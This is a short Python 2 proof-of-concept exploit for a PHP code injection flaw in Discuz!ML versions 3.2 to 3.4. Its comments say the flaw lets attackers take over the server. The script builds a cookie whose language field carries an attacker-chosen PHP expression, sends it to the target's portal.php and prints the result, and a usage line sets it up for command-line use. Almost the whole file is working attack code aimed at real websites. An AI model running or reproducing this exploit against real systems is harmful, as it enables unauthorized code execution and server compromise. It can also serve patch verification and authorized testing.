# -*- coding:utf-8 -*-
# Discuz ML! V3.X存在代码注入漏洞，攻击者通过精心构建的请求报文可以直接执行恶意的PHP代码，进一步可获取整个网站的服务器权限。
# 漏洞影响版本：
# Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3
# Author: heyzm
# 
# 
import requests,sys

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}

def poc(url,eexec):
	url = 'http://'+url+'/portal.php'
	cookie = "4gH4_0df5_saltkey=V2rU23EB;4gH4_0df5_language=en'.{0}.';4gH4_0df5_lastvisit=1562777028;4gH4_0df5_sid=rrh6or;4gH4_0df5_lastact=1562780628%09portal.php%09;4gH4_0df5_sid=rrh6or".format(eexec)
	res = requests.get(url,headers=headers,cookies={"Cookie":cookie})
	print res.text.encode('gbk', 'ignore').decode('gbk')[0:80]
	
if __name__ == '__main__':
	if len(sys.argv) <=2:
		print 'Usage: python poc.py <url> <php function>'
		sys.exit()
	else:
		poc(sys.argv[1],sys.argv[2])
